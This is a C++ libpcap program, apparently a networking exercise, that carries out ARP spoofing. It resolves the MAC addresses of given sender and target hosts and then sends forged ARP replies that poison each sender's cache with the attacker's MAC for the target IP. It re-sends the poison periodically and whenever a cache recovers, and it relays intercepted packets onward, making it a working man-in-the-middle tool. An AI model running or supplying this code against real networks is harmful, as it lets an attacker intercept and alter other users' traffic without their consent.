#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/types.h>
#include <sys/socket.h>
#include <net/if.h>
#include <string.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netinet/in.h>
#include <time.h>


#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

typedef struct libnet_ethernet_hdr{
   u_int8_t dstmac[6];
   u_int8_t srcmac[6];
   u_int16_t type;
}Ethernet_Header;

void usage() {
	printf("syntac : send-arp <interface> <sender ip> <target ip> \n");
	printf("sample : send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

typedef struct arp_header{
	u_int16_t Hardware_addrtype;
	u_int16_t protocol_type;
	u_int8_t Hardware_addrlength;
	u_int8_t protocol_length;
	u_int16_t operation;
	u_int8_t s_mac[6];
	u_int8_t s_ip[4];
	u_int8_t t_mac[6];
	u_int8_t t_ip[4];

}Arp_Header;

void get_mac_ip(char* dev, char MAC_str[18], char my_ip[40])
{
    #define HWADDR_len 6
    int s,i;
    struct ifreq ifr;
    s = socket(AF_INET, SOCK_DGRAM, 0);
    strcpy(ifr.ifr_name, dev);
    ioctl(s, SIOCGIFHWADDR, &ifr);
    for (i=0; i<HWADDR_len; i++)
        sprintf(&MAC_str[i*3],"%02X:",((unsigned char*)ifr.ifr_hwaddr.sa_data)[i]);
    MAC_str[17]='\0';
	ioctl(s, SIOCGIFADDR, &ifr);
	inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2,my_ip,sizeof(struct sockaddr));
    close(s);
}

bool chk_Ethernet_Header(const u_char* packet){
	Ethernet_Header *Header;
	Header = (Ethernet_Header*)packet;

	if(Header->type == 0x0608){
		printf("get Arp packet\n");
		return true;
	}
	//printf("not Arp packet!\n");
	return false;
}

bool chk_Ethernet_Header_Mac(const u_char* packet, char mac[18]){
	Ethernet_Header *Header;
	Header = (Ethernet_Header*)packet;
	char new_mac[18];
	for(int i=0; i<6; i++){
		sprintf(&new_mac[i*3], "%02X:", Header->srcmac[i]);
	}
	new_mac[17] = '\0';
	//printf("new mac: %s  sender mac: %s\n", new_mac, mac);
	if(strcmp(mac,new_mac)==0){
		printf("get Arp recover\n");
		return true;
	}
	return false;
}


bool chk_Arp_Reply(const u_char* packet){
	Arp_Header *Header;
	Header = (Arp_Header*)packet;
	if(Header->operation == 0x0200){
		printf("get Arp Reply\n");
		return true;
	}
	return false;
}

void get_Sender(const u_char* packet, char sender_mac[18]){
	Arp_Header *Header;
	Header = (Arp_Header*)packet;
	for(int i=0; i<6;i++){
		sprintf(&sender_mac[i*3], "%02X:",Header->s_mac[i]);
	}
	sender_mac[17] = '\0';
}

int send_arp_packet(pcap_t* handle, char eth_dmac[18], char eth_smac[18], int arp, char arp_smac[18], char arp_sip[40], char arp_dmac[18], char arp_dip[40]){
	EthArpPacket packet;
	
	packet.eth_.dmac_ = Mac(eth_dmac);
	packet.eth_.smac_ = Mac(eth_smac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	if(arp == 0){
		packet.arp_.op_ = htons(ArpHdr::Request);
	} else{
		packet.arp_.op_ = htons(ArpHdr::Reply);
	}

	packet.arp_.smac_ = Mac(arp_smac);
	packet.arp_.sip_ = htonl(Ip(arp_sip));
	packet.arp_.tmac_ = Mac(arp_dmac);
	packet.arp_.tip_ = htonl(Ip(arp_dip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if(res != 0){
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		return 0;
	}
	return res;
}

void get_Sender_Mac(pcap_t* handle, char my_mac[18], char my_ip[40], char sender_mac[18], char sender_ip[40]){
	
	send_arp_packet(handle, "ff:ff:ff:ff:ff:ff", my_mac, 0, my_mac, my_ip, "00:00:00:00:00:00", sender_ip);


	while(true){
		struct pcap_pkthdr* header;
		const u_char* packet1;
		int res1 = pcap_next_ex(handle, &header, &packet1);
		if(res1 == 0) continue;
		if(res1 == -1 || res1==-2){
			printf("pcap_next_ex return %d(%s)\n", res1, pcap_geterr(handle));
			break;
		}

		if(chk_Ethernet_Header(packet1)){
			packet1 += 14;
			if(chk_Arp_Reply(packet1)){
				get_Sender(packet1, sender_mac);
				break;
			}
		}
	}
	printf("Sender Mac: %s\n",sender_mac);

}

int main(int argc, char* argv[]) {
	if (argc%2 == 1) {
		usage();
		return -1;
	}

	
	int numberOfFlow = (argc-2)/2;
	char my_mac[18];
	char my_ip[40]; //not necessary?
	char sender_mac[numberOfFlow][18];
	char sender_ip[numberOfFlow][40];
	char target_mac[numberOfFlow][18];
	char target_ip[numberOfFlow][40];

	for(int i = 0; i<numberOfFlow; i++){
		strcpy(sender_ip[i], argv[(i+1)*2]);
		strcpy(target_ip[i], argv[(i+1)*2+1]);
	}

	get_mac_ip(argv[1], my_mac, my_ip);

	printf("my mac: %s\n", my_mac);
	printf("my ip : %s\n", my_ip);

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	for (int i = 0; i < numberOfFlow; i++){
		get_Sender_Mac(handle, my_mac, my_ip, sender_mac[i], sender_ip[i]);
	}
	
	for(int i = 0; i < numberOfFlow; i++){
		get_Sender_Mac(handle, my_mac, my_ip, target_mac[i], target_ip[i]);
	}

	for (int i = 0; i < numberOfFlow; i++){
		send_arp_packet(handle, sender_mac[i], my_mac, 1, my_mac, target_ip[i], sender_mac[i], sender_ip[i]);
	}

	time_t start, end;
	start = time(NULL);

	while(true){
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if(res == 0) continue;
		if(res == -1 || res==-2){
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}
		end = time(NULL);
		if((end-start)>2){
			for (int i = 0; i < numberOfFlow; i++){
				send_arp_packet(handle, sender_mac[i], my_mac, 1, my_mac, target_ip[i], sender_mac[i], sender_ip[i]);
			}
		}
		if(chk_Ethernet_Header(packet)){
			for(int i=0; i<numberOfFlow; i++){
				if(chk_Ethernet_Header_Mac(packet,sender_mac[i])){
					packet+=14;
					if(!chk_Arp_Reply(packet)){
						send_arp_packet(handle, sender_mac[i], my_mac, 1, my_mac, target_ip[i], sender_mac[i], sender_ip[i]);
						break;
					}
				}
			}
		}

		else{
			for(int i = 0 ; i < numberOfFlow; i++){
				if(chk_Ethernet_Header_Mac(packet,sender_mac[i])){
					printf("target mac : %s, my_mac : %s", target_mac[i], my_mac);
					u_char *relay_packet = (u_char*)malloc(header->caplen+1);
					memcpy(relay_packet, packet, header->caplen);
					memcpy(relay_packet, Mac(target_mac[i]), Mac::SIZE);
					memcpy(relay_packet+6, Mac(my_mac), Mac::SIZE);
					int res = pcap_sendpacket(handle, (const u_char*)relay_packet, header->caplen);
					if(res != 0){
						fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
					}
					free(relay_packet);
				}
			}
		}

	}

	pcap_close(handle);
}
